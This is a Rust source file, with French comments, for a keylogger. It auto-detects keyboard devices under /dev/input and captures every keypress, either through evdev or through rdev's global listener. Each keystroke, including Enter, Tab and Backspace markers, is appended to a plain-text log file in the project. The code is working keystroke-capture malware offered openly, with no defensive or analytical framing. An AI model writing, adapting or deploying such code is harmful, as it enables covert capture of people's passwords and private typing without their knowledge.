use evdev::{Device, InputEventKind, Key};
use rdev::{listen, Event, EventType};
use std::fs::OpenOptions;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

/// 📁 Écrit les frappes dans Logs/log.log à la racine du projet
fn write_plain_log(data: &str) {
    let log_path = std::env::current_exe()
        .expect("❌ Impossible d'obtenir le chemin de l'exécutable")
        .parent().unwrap()
        .parent().unwrap()
        .parent().unwrap()
        .join("src")
        .join("Logs")
        .join("log.log");

    std::fs::create_dir_all(log_path.parent().unwrap())
        .expect("❌ Impossible de créer le dossier Logs");

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&log_path)
        .expect("❌ Impossible d'ouvrir le fichier log");

    writeln!(file, "{}", data).expect("❌ Écriture dans log échouée");
}

/// 🔍 Détecte automatiquement le device correspondant au clavier
pub fn detect_keyboard_device() -> Option<String> {
    let entries = std::fs::read_dir("/dev/input/").ok()?;

    for entry in entries {
        if let Ok(entry) = entry {
            let path = entry.path();

            if path.to_string_lossy().contains("event") {
                if let Ok(dev) = Device::open(&path) {
                    let name = dev.name().unwrap_or("unknown").to_string();

                    let supported_keys = dev.supported_keys();
                    let is_keyboard = supported_keys.map_or(false, |keys| {
                        keys.contains(Key::KEY_A)
                            && keys.contains(Key::KEY_ENTER)
                            && keys.contains(Key::KEY_SPACE)
                    });

                    if is_keyboard && name.to_lowercase().contains("keyboard") {
                        println!("🎹 Clavier détecté: {} → {}", name, path.display());
                        return Some(path.to_string_lossy().into());
                    }
                }
            }
        }
    }

    None
}

/// 🎯 Lance le keylogger classique (basé sur evdev)
pub fn start_keylogger(device_path: &str, _passphrase: &str) {
    let path = if device_path == "auto" {
        detect_keyboard_device().expect("❌ Aucun clavier détecté.")
    } else {
        device_path.to_string()
    };

    let mut dev = Device::open(&path).expect("❌ Impossible d'ouvrir le device");
    println!("[*] Keylogger démarré sur {}", path);

    write_plain_log("[*] Keylogger lancé\n");
    let buffer = Arc::new(Mutex::new(String::new()));
    let buffer_clone = Arc::clone(&buffer);

    // 🧵 Thread secondaire : écrit toutes les 5 sec
    thread::spawn(move || loop {
        thread::sleep(Duration::from_secs(5));
        let mut buf = buffer_clone.lock().unwrap();
        if !buf.is_empty() {
            println!("💾 Sauvegarde des frappes dans le fichier log...");
            write_plain_log(&buf);
            buf.clear();
        }
    });

    // 🎧 Thread principal : écoute les touches
loop {
    if let Ok(events) = dev.fetch_events() {
        for ev in events {
            if let InputEventKind::Key(key) = ev.kind() {
                if ev.value() == 1 {
                    println!("⌨️ Touche détectée : {:?}", key);
                    let key_str = format!("{:?} ", key);

                    {
                        let mut buf = buffer.lock().unwrap();
                        buf.push_str(&key_str);
                    }

                    // 🛠️ Ajout : écrire immédiatement dans log.log
                    write_plain_log(&key_str);
                }
            }
        }
    }

    thread::sleep(Duration::from_millis(10));
}
}

/// 🚀 Lance le keylogger global (basé sur rdev)
pub fn start_rdev_logger() {
    println!("[*] Keylogger démarré (mode rdev, global)");

    if let Err(error) = listen(callback) {
        println!("❌ Erreur écoute des touches : {:?}", error);
    }
}

/// 📋 Callback utilisé par rdev pour chaque touche
fn callback(event: Event) {
    if let EventType::KeyPress(key) = event.event_type {
        let key_str = format!("{:?}", key);

        match key_str.as_str() {
            "Return" => write_plain_log("\n"),
            "Space" => write_plain_log(" "),
            "Tab" => write_plain_log("[TAB]"),
            "Escape" => write_plain_log("[ESC]"),
            "Backspace" => write_plain_log("[BACKSPACE]"),
            _ => write_plain_log(&key_str),
        }
    }
}
